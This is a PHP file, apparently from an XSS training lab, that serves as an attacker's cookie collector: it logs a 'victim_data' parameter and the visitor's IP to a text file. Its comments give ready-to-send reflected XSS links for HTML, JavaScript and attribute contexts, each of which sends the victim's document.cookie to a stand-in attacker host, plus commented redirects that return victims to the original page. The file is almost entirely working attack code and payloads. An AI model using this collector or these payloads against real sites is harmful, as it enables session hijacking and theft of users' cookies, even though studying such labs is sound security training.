<?php 

//This document take the victim_data variable and log it. 

$victim_data = $_GET['victim_data'] . " | {$_SERVER['REMOTE_ADDR']}"; //Get the victim data.

file_put_contents('bazinga_cookie.txt', $victim_data. PHP_EOL, FILE_APPEND | LOCK_EX); //Put the fetched data taken by victim to log file.


//header("location: http://learnvul.com/XSS/Reflected_XSS/reflected_xss_html_context/reflected_xss_html_front.php");  //redirect user to the original site for xss in html context.
//header("location: http://learnvul.com/XSS/Reflected_XSS/reflected_xss_js_context/reflected_xss_js_front.php"); //redirect user to the original site for xss in js context.
//header("location: http://learnvul.com/XSS/Reflected_XSS/reflected_xss_attribute_context/ref_xss_attribute_front.php");//redirect user to the original site for xss in attribute context.

//Link to be sent for reflected xss in html context: 
	//http://learnvul.com/XSS/Reflected_XSS/reflected_xss_html_context/reflected_xss_html_processor.php?search_word=%3Cscript%3Elocation.href%3d%22http%3a//bazinga.com/hack_xss_reflected.php%3fvictim_data%3d%22%2bdocument.cookie%3C/script%3E&Ara=G%C3%B6nder

//Links to be sent for reflected xss in js context
    //http://learnvul.com/XSS/Reflected_XSS/reflected_xss_js_context/reflected_xss_js_processor.php?search_word=';location.href%3d%22http%3a//bazinga.com/hack_xss_reflected.php%3fvictim_data%3d%22%2bdocument.cookie;//&Ara=G%C3%B6nder

	//http://learnvul.com/XSS/Reflected_XSS/reflected_xss_html_context/reflected_xss_html_processor.php?search_word=%3C/script%3E%3Cscript%3Elocation.href%3d%22http%3a//bazinga.com/hack_xss_reflected.php%3fvictim_data%3d%22%2bdocument.cookie%3C/script%3E&Ara=G%C3%B6nder

//Link to be sent for reflected xss in tag attribute context: 

    //http://learnvul.com/XSS/Reflected_XSS/reflected_xss_attribute_context/ref_xss_attribute_processor.php?search_word='onfocus%3dlocation.href%3d%22http%3a//bazinga.com/hack_xss_reflected.php%3fvictim_data%3d%22%2bdocument.cookie%20tabindex%3d1%3e%23inputId%3b//&Ara=G%C3%B6nder

	//http://learnvul.com/XSS/Reflected_XSS/reflected_xss_attribute_context/ref_xss_attribute_processor.php?search_word='onfocus%3dlocation.href%3d%22http%3a//bazinga.com/hack_xss_reflected.php%3fvictim_data%3d%22%2bdocument.cookie%20tabindex%3d1%3e%23inputId%3b//&Ara=G%C3%B6nder


?>





